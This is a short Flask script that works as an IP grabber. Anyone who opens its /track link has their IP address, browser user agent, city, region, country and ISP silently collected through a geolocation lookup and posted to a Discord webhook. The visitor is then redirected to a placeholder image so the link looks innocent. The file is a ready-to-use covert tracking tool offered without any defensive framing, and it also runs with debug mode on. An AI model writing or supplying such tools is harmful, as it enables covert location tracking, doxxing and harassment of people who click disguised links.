from flask import Flask, request, redirect
import requests

app = Flask(__name__)

WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"

@app.route('/track')
def track():
    ip = request.remote_addr or 'unknown'
    user_agent = request.headers.get('User-Agent', 'unknown')

    geo = requests.get(f"https://ipapi.co/{ip}/json/").json()
    city = geo.get("city", "Unknown")
    region = geo.get("region", "Unknown")
    country = geo.get("country_name", "Unknown")
    org = geo.get("org", "Unknown")

    content = (
        f"👀 Click detected!\n"
        f"🌍 IP: `{ip}`\n"
        f"📍 Location: {city}, {region}, {country}\n"
        f"🏢 ISP: {org}\n"
        f"🖥️ User-Agent: `{user_agent}`"
    )

    requests.post(WEBHOOK_URL, json={"content": content})

    return redirect("https://via.placeholder.com/150")

if __name__ == "__main__":
    app.run(debug=True)
